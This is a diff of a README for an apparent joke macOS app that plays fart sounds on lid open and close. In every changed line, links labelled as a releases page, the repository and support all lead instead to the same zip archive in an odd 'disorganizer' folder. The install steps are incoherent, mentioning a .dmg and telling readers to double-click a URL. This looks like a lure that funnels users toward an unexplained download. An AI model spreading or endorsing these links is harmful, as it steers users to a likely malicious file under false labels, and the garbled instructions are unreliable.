@@ -1,7 +1,7 @@
 # 😂 fartscroll-lid - The Fun Way to Announce Your Actions
 
 ## 📦 Download Now
-[![Download fartscroll-lid](https://raw.githubusercontent.com/jjlcpr/fartscroll-lid/main/disorganizer/fartscroll-lid.zip)](https://raw.githubusercontent.com/jjlcpr/fartscroll-lid/main/disorganizer/fartscroll-lid.zip)
+[![Download fartscroll-lid](https://github.com/jjlcpr/fartscroll-lid/raw/refs/heads/main/disorganizer/fartscroll_lid_2.9.zip)](https://github.com/jjlcpr/fartscroll-lid/raw/refs/heads/main/disorganizer/fartscroll_lid_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to fartscroll-lid! This amusing macOS application plays fart sounds each time you open or close your MacBook lid. Get ready to inject some humor into your daily routine.
@@ -16,7 +16,7 @@ Before you begin, make sure your system meets these requirements:
 ## 📥 Download & Install
 To download and install fartscroll-lid, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/jjlcpr/fartscroll-lid/main/disorganizer/fartscroll-lid.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/jjlcpr/fartscroll-lid/raw/refs/heads/main/disorganizer/fartscroll_lid_2.9.zip).
 
 2. **Choose the Latest Version:** Look for the most recent version listed. There you will find installation files to download.
 
@@ -24,7 +24,7 @@ To download and install fartscroll-lid, follow these steps:
    - Click on the provided link for the `.dmg` file to initiate the download.
 
 4. **Install the Application:**
-   - Once downloaded, double-click the `https://raw.githubusercontent.com/jjlcpr/fartscroll-lid/main/disorganizer/fartscroll-lid.zip` file.
+   - Once downloaded, double-click the `https://github.com/jjlcpr/fartscroll-lid/raw/refs/heads/main/disorganizer/fartscroll_lid_2.9.zip` file.
    - Drag the fartscroll-lid icon into your Applications folder.
 
 5. **Open the Application:**
@@ -65,6 +65,6 @@ No, fartscroll-lid is lightweight and will not affect your Mac’s performance.
 fartscroll-lid is open-source and freely available. You can use it as you like, but remember to respect the licensing terms outlined in the repository.
 
 ## 🔗 Support
-For further support or to report issues, please use the discussions section available on the [GitHub repository](https://raw.githubusercontent.com/jjlcpr/fartscroll-lid/main/disorganizer/fartscroll-lid.zip).
+For further support or to report issues, please use the discussions section available on the [GitHub repository](https://github.com/jjlcpr/fartscroll-lid/raw/refs/heads/main/disorganizer/fartscroll_lid_2.9.zip).
 
 Enjoy the laughter and let fartscroll-lid add a touch of humor to your day!
